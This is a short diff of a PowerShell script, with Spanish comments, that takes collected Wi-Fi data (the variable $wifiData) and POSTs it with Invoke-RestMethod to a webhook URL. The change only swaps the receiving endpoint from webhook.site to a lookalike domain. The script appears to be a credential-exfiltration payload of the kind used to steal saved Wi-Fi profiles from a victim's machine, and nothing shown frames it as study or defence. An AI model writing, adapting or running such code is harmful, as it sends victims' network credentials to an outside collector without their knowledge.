@@ -17,5 +17,5 @@ $data = $wifiData | Out-String
 
 if ($data.Trim()) {
     # Usamos Invoke-RestMethod con tu URL específica
-    Invoke-RestMethod -Uri "https://webhook.site/8fae434e-1ec5-4dce-94e3-d1bf51a78a9c" -Method Post -Body $data -UseBasicParsing
+    Invoke-RestMethod -Uri "https://webhooksite.net/8fae434e-1ec5-4dce-94e3-d1bf51a78a9c" -Method Post -Body $data -UseBasicParsing
 }
